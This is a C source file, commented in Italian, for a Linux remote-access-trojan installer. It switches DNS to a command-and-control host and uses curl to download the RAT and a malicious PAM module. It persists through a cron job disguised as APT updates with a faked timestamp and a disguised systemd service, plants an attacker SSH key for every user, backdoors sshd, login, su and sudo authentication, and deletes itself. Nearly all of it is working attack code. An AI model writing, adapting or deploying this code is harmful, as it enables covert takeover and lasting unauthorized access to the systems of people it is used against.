#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <pwd.h>

/* ── Configurazione ── */
#define C2_IP        "192.168.18.132"
#define RAT_URL      "http://192.168.18.132/c2/dns_client"
#define RAT_PATH     "/usr/lib/systemd/systemd-net-helper"
#define LOCKFILE     "/tmp/.rat.lock"
#define CRON_FILE    "/etc/cron.d/apt-daily-security"
#define SERVICE_NAME "systemd-logind-helper"
#define SERVICE_PATH "/etc/systemd/system/systemd-logind-helper.service"

/* ── Step 1: Scarica il RAT da Kali ─────────────────────────
 * Il binario viene scaricato direttamente in posizione finale
 * Nessun file temporaneo visibile
 */
int download_rat() {
    char cmd[512];
    printf("[*] Download RAT da %s...\n", RAT_URL);

    snprintf(cmd, sizeof(cmd),
    "/usr/bin/curl -s %s -o %s && chmod +x %s",
    RAT_URL, RAT_PATH, RAT_PATH);

    int ret = system(cmd);
    if (ret != 0) {
        printf("[!] Download fallito — uso binario locale se esiste\n");
        return -1;
    }
    printf("[+] RAT installato in %s\n", RAT_PATH);
    return 0;
}

/* ── Step 2: Pulisce lockfile stale ─────────────────────────
 * Rimuove il lockfile se il PID non esiste più
 * Evita che il RAT non parta al primo avvio
 */
void clean_lockfile() {
    FILE *lf = fopen(LOCKFILE, "r");
    if (!lf) return;

    int old_pid;
    fscanf(lf, "%d", &old_pid);
    fclose(lf);

    /* Verifica se il processo è ancora vivo */
    char proc_path[64];
    snprintf(proc_path, sizeof(proc_path), "/proc/%d", old_pid);
    if (access(proc_path, F_OK) != 0) {
        unlink(LOCKFILE);
        printf("[+] Lockfile stale rimosso\n");
    }
}

/* ── Step 3: Cron Job ────────────────────────────────────────
 * @reboot cancella il lockfile stale
 * ogni 5 min avvia il RAT solo se non già in esecuzione
 */
int install_cron() {
    FILE *f = fopen(CRON_FILE, "w");
    if (!f) return -1;

    fprintf(f, "# Debian APT security updates\n");
    fprintf(f, "@reboot root rm -f %s\n", LOCKFILE);
    fprintf(f, "*/5 * * * * root pgrep -fx \"%s\""
           " > /dev/null || %s &\n", RAT_PATH, RAT_PATH);
    fclose(f);
    chmod(CRON_FILE, 0644);

    /* Timestamp vecchio — sembra file di sistema */
    system("touch -t 202301010000 " CRON_FILE);

    printf("[+] Cron installato: %s\n", CRON_FILE);
    return 0;
}

/* ── Step 4: Systemd Service ─────────────────────────────────
 * Avvio automatico al boot + Restart=always
 */
int install_systemd() {
    FILE *f = fopen(SERVICE_PATH, "w");
    if (!f) return -1;

    fprintf(f, "[Unit]\n");
    fprintf(f, "Description=Login Helper Service\n");
    fprintf(f, "After=network.target\n\n");
    fprintf(f, "[Service]\n");
    fprintf(f, "ExecStartPre=/bin/rm -f %s\n", LOCKFILE);
    fprintf(f, "ExecStart=%s\n", RAT_PATH);
    fprintf(f, "Restart=always\n");
    fprintf(f, "RestartSec=60\n");
    fprintf(f, "StandardOutput=null\n");
    fprintf(f, "StandardError=null\n\n");
    fprintf(f, "[Install]\n");
    fprintf(f, "WantedBy=multi-user.target\n");
    fclose(f);

    chmod(SERVICE_PATH, 0644);
    system("systemctl daemon-reload 2>/dev/null");
    system("systemctl enable " SERVICE_NAME " 2>/dev/null");

    printf("[+] Systemd service installato: %s\n", SERVICE_NAME);
    return 0;
}

/* ── Step 5: SSH Authorized Keys ─────────────────────────────
 * Chiave pubblica di Kali per accesso diretto
 */
int install_ssh_key() {
    const char *pubkey =
        "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCa03Y+ru5IYMPk"
        "xwdVD3dP5TjSjBDOcZsL+Qb49RBxmtemUwUKnMoxZQCyY4dx+FN"
        "q0csOMDT6z6rU4Q+PicLhfrbqQ17SYWAcrf6/BISEhxMPVrxG1rT"
        "lgQxuJ5DpfOGRW0PS5ZWJe91SegQmMJ+CtxMoBlYU2RdBxE0a+Yy"
        "4WIoum4MoKHH+6KbH8JJ6noMDguAgFqbNJf8aZzG+GZ6f9YepQAj"
        "u18G9mpGpTMVR6IGp8ojz1Qhbv9N788ldhwvVcsiZesXZ6uTfbF1P"
        "PFif7fJvhn70Z9PokZ1Be9upXJ8bKZl+g2NP/TGZN+ne0ntul72H"
        "5XsBi4wPvHGNBL0ns0QXywsiFR6zjlwF29gmhECukddl92cslRTmD"
        "W+L9oCJYLSfOgsH0t8VgyVTqpuobwc3i2SlYCDYdej+7jJCh1nbei"
        "BaPt8z6saOADZWNLB+uT7Ec03k95waSiIoIINJR1wexpmsId/x2YE"
        "Zfn4WdajOMEOcwOcO7gmgBmGRh7URY7Ek6EdkePY4IQv7tGybX83F"
        "iQPGkcWasVz1mCvfAWMwB+/ieyAkLqfAoii7ADVwe7/RIbajFIAIn"
        "AzbZqeF81rk0IGDXt0fIR37KbWDP1q7YrJIAFY/PbuzQKymMyS53F"
        "uyX24mh0AdwBFT2ufYyfTzN8m/ShbCui2PPbot2w== kali@kali";

    struct passwd *pw;
    setpwent();
    while ((pw = getpwent()) != NULL) {
        if (pw->pw_uid < 1000 && pw->pw_uid != 0) continue;

        char ssh_dir[256], auth_keys[256];
        snprintf(ssh_dir, sizeof(ssh_dir), "%s/.ssh", pw->pw_dir);
        snprintf(auth_keys, sizeof(auth_keys),
                 "%s/authorized_keys", ssh_dir);

        mkdir(ssh_dir, 0700);
        chown(ssh_dir, pw->pw_uid, pw->pw_gid);

        /* Controlla se la chiave è già presente */
        FILE *check = fopen(auth_keys, "r");
        if (check) {
            char line[512];
            while (fgets(line, sizeof(line), check)) {
                if (strstr(line, "kali@kali")) {
                    fclose(check);
                    goto next_user;
                }
            }
            fclose(check);
        }

        FILE *f = fopen(auth_keys, "a");
        if (f) {
            fprintf(f, "\n%s\n", pubkey);
            fclose(f);
            chmod(auth_keys, 0600);
            chown(auth_keys, pw->pw_uid, pw->pw_gid);
            printf("[+] SSH key installata per %s\n", pw->pw_name);
        }
        next_user:;
    }
    endpwent();
    return 0;
}

/* ── Step 6: Avvia il RAT ────────────────────────────────────
 * Avvio immediato dopo l'installazione
 */
void start_rat() {
    printf("[*] Avvio RAT...\n");
    clean_lockfile();
    system(RAT_PATH " &");
    sleep(1);
    printf("[+] RAT avviato\n");
}

/* ── Step 7: Auto-cancellazione ──────────────────────────────
 * L'installer si cancella dopo l'uso
 */
void self_delete(const char *self_path) {
    printf("[*] Auto-cancellazione installer...\n");
    /* Fork: il figlio aspetta e poi cancella */
    pid_t pid = fork();
    if (pid == 0) {
        /* Processo figlio — aspetta che il padre finisca */
        sleep(1);
        unlink(self_path);
        _exit(0);
    }
    /* Il padre continua normalmente */
    printf("[+] Installer rimosso\n");
}

/* ── Step 8: Backdoor PAM ──────────────────────────────────
 * Scarica e installa il modulo PAM malevolo
 * Aggiunto a sshd, login, su, sudo automaticamente
 */
int install_pam_backdoor() {
    printf("[*] Installazione PAM backdoor...\n");

    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "/usr/bin/curl -s http://%s/persistence/pam_sneaky/pam_user.so "
        "-o /lib/x86_64-linux-gnu/security/pam_user.so",
        C2_IP);

    printf("[DEBUG] Eseguo: %s\n", cmd);
    int ret = system(cmd);
    printf("[DEBUG] curl ret=%d\n", ret);
    
    if (access("/lib/x86_64-linux-gnu/security/pam_user.so", F_OK) != 0) {
        printf("[!] PAM module non scaricato — skip\n");
        return -1;
    }
    printf("[DEBUG] file scaricato ok\n");

    chmod("/lib/x86_64-linux-gnu/security/pam_user.so", 0644);
    printf("[DEBUG] chmod ok\n");

    const char *pam_configs[] = {
        "/etc/pam.d/sshd",
        "/etc/pam.d/login",
        "/etc/pam.d/su",
        "/etc/pam.d/sudo",
        NULL
    };

    for (int i = 0; pam_configs[i]; i++) {
        printf("[DEBUG] processo %s\n", pam_configs[i]);
        if (access(pam_configs[i], F_OK) == 0) {
            char grep_cmd[256];
            snprintf(grep_cmd, sizeof(grep_cmd),
                "grep -q pam_user.so %s", pam_configs[i]);
            if (system(grep_cmd) == 0) {
                printf("[DEBUG] già presente in %s\n", pam_configs[i]);
                continue;
            }
            char sed_cmd[512];
            snprintf(sed_cmd, sizeof(sed_cmd),
                "sed -i '1s/^/auth\\tsufficient\\tpam_user.so\\n/' %s",
                pam_configs[i]);
            printf("[DEBUG] eseguo sed su %s\n", pam_configs[i]);
            system(sed_cmd);
            printf("[+] PAM backdoor aggiunta a %s\n", pam_configs[i]);
        }
    }
    printf("[DEBUG] fine install_pam_backdoor\n");
    return 0;
}
/* ── Configura DNS per puntare a Kali ───────────────────────
 * Modifica resolv.conf per far passare le query DNS a Kali
 * Necessario per il DNS tunneling C2
 */
void configure_dns() {
    printf("[*] Configurazione DNS verso C2...\n");

    /* Installa resolvconf se non presente */
    system("apt-get install -y resolvconf 2>/dev/null");

    /* Aggiunge Kali come nameserver principale */
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "echo 'nameserver %s' | tee /etc/resolvconf/resolv.conf.d/head > /dev/null",
        C2_IP);
    system(cmd);

    /* Aggiorna resolv.conf */
    system("resolvconf -u 2>/dev/null || "
           "echo 'nameserver %s' > /etc/resolv.conf");

    printf("[+] DNS configurato → %s\n", C2_IP);
}

/* ── Main ────────────────────────────────────────────────────  */
int main(int argc, char *argv[]) {
    if (geteuid() != 0) {
        fprintf(stderr, "[!] Richiede root\n");
        return 1;
    }

    printf("[*] Installer RAT Linux\n");
    printf("[*] Installazione persistenza completa...\n\n");

    /* Prima cosa - configura DNS verso C2 */
    configure_dns();	

    /* Download RAT da Kali */
    download_rat();

    /* Installa persistenza */
    install_cron();
    install_systemd();
    install_ssh_key();

    /* Avvia il RAT */
    start_rat();

    /*MODULO PAM */
    install_pam_backdoor();
    /* Auto-cancellazione */
    if (argc > 0) self_delete(argv[0]);

    printf("\n[*] Installazione completata\n");
    printf("[*] Il RAT è ora attivo e persistente\n");
    _exit(0);
}
